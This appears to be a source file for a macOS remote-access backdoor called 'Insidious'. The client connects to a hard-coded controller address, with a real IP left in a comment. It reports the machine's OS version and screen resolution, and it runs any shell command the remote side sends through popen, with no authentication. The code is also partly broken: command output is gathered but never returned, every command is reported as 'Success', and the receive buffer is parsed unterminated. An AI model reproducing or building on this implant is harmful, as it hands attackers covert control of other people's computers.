//
//  connect.cpp
//  Insidious
//

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#import "connect.hpp"
#include <iostream>
#include <sys/types.h>   // Types used in sys/socket.h and netinet/in.h
#include <netinet/in.h>  // Internet domain address structures and functions
#include <sys/socket.h>  // Structures and functions used for socket API
#include <netdb.h>       // Used for domain/DNS hostname lookup
#include <unistd.h>
#include <errno.h>
#include <stdio.h>
#include "rapidjson/document.h"
#include "rapidjson/prettywriter.h"
#include "rapidjson/filestream.h"
#include "rapidjson/stringbuffer.h"

void* SocketConnect::openSocket(void *arg) {
    int socketHandle;
    
    // create socket
    if((socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)) < 0)
    {
        fprintf(stderr, "Could not create socket handle.\n");
        close(socketHandle);
        return 0;
    }
    
	struct sockaddr_in remoteSocketInfo;
	struct hostent *hPtr;

	char *remoteHost = "127.0.0.1";//"173.26.250.104";
	int portNumber = 55555;
    
	bzero(&remoteSocketInfo, sizeof(sockaddr_in));  // Clear structure memory
    
	// Get system information
	if((hPtr = gethostbyname(remoteHost)) == NULL)
	{
        fprintf(stderr, "System DNS name resolution not configured properly.\n");
        fprintf(stderr, "Error number: %d\n", ECONNREFUSED);
        return 0;
	}
    
	// Load system information for remote socket server into socket data structures
	memcpy((char *)&remoteSocketInfo.sin_addr, hPtr->h_addr, hPtr->h_length);
	remoteSocketInfo.sin_family = AF_INET;
	remoteSocketInfo.sin_port = htons((u_short)portNumber);      // Set port number
    
    fprintf(stderr, "Attempting socket connection...\n");
    if(connect(socketHandle, (struct sockaddr *)&remoteSocketInfo, sizeof(sockaddr_in)) < 0)
    {
        fprintf(stderr, "Could not open socket.\n");
        close(socketHandle);
        return 0;
    }

    // Socket connected
    fprintf(stderr, "Socket connected.\n");
    
    char buffer[1000] = "";
    while(1) {
        ssize_t message = recv(socketHandle, buffer, sizeof(buffer), 0);
        if(message == -1) break;
        if(message == 0) continue;
        
        // Got message, parse the JSON
        rapidjson::Document document;
        if (document.Parse<0>(buffer).HasParseError()) {
            continue; // Skip if error parsing
        }
        
        if(strcmp(document["req"].GetString(), "details") == 0) {
            rapidjson::StringBuffer s;
            rapidjson::Writer<rapidjson::StringBuffer> writer(s);
            writer.StartObject();
            writer.String("res");
            writer.String("details");
            
            // Detect OS
            SInt32 versionMajor = 0;
            SInt32 versionMinor = 0;
            SInt32 versionBugFix = 0;
            Gestalt( gestaltSystemVersionMajor, &versionMajor );
            Gestalt( gestaltSystemVersionMinor, &versionMinor );
            Gestalt( gestaltSystemVersionBugFix, &versionBugFix );

            writer.String("os");
            writer.StartObject();
                writer.String("name");
                writer.String("Mac OS X");
                writer.String("version");
                char versionStr[50];
                sprintf(versionStr, "%d.%d.%d", versionMajor, versionMinor, versionBugFix);
                writer.String(versionStr);
                writer.String("resolution");
                char resolutionStr[50];
                int screenWidth = [NSScreen mainScreen].frame.size.width;
                int screenHeight = [NSScreen mainScreen].frame.size.height;
                sprintf(resolutionStr, "%dx%d", screenWidth, screenHeight);
                writer.String(resolutionStr);
            writer.EndObject();
            
            writer.String("devices");
            writer.StartArray();
            
            writer.EndArray();
            writer.EndObject();
            
            const char *message = s.GetString();
            send(socketHandle, message, strlen(message), 0);
        } else if(strcmp(document["req"].GetString(), "execute") == 0) {
            char *cmdOutput;
            FILE* pipe = popen(document["cmd"].GetString(), "r");
            if(pipe) {
                char buffer[128];
                std::string result = "";
                while(!feof(pipe)) {
                    if(fgets(buffer, 128, pipe) != NULL)
                        result += buffer;
                }
                pclose(pipe);
            } else {
                cmdOutput = "Error, could not open pipe.";
            }
            rapidjson::StringBuffer s;
            rapidjson::Writer<rapidjson::StringBuffer> writer(s);
            writer.StartObject();
            writer.String("res");
            writer.String("execute");
            writer.String("cmd");
            //writer.String(cmdOutput);
            writer.String("Success");
            writer.EndObject();
            const char *jsonReply = s.GetString();
            send(socketHandle, jsonReply, strlen(jsonReply), 0);
        }
    }

    // Finished with socket
    close(socketHandle);
    return 0;
}